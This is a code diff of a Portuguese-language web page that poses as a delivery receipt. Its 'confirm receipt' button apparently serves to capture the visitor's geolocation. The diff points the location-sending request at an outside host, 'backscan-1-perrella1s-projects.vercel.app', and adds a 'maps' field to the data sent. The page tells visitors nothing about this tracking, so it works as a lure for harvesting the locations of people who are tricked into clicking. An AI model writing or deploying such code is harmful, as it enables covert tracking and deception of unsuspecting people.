@@ -20,8 +20,7 @@
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
 
-    <button class="botao" onclick="navigator.geolocation.getCurrentPosition(sendLocation, handleError)">Clique aqui para
-      confirmar o recebimento</button>
+    <button class="botao" onclick="navigator.geolocation.getCurrentPosition(sendLocation, handleError)">Clique aqui para confirmar o recebimento</button>
 
     <div class="comprovante-footer">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
@@ -58,12 +57,12 @@
       // console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
-      fetch("/api/receber-localizacao", {
+      fetch("backscan-1-perrella1s-projects.vercel.app/api/receber-localizacao", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude })
+        body: JSON.stringify({ latitude, longitude, maps })
       })
         .then(response => response.json())
         .then(data => {
@@ -73,10 +72,10 @@
             alert("Algo deu errado. Tente novamente mais tarde.");
           }
         })
+
         .catch(error => {
           console.error("Erro:", error);
         });
-
     }
 
     function handleError(error) {
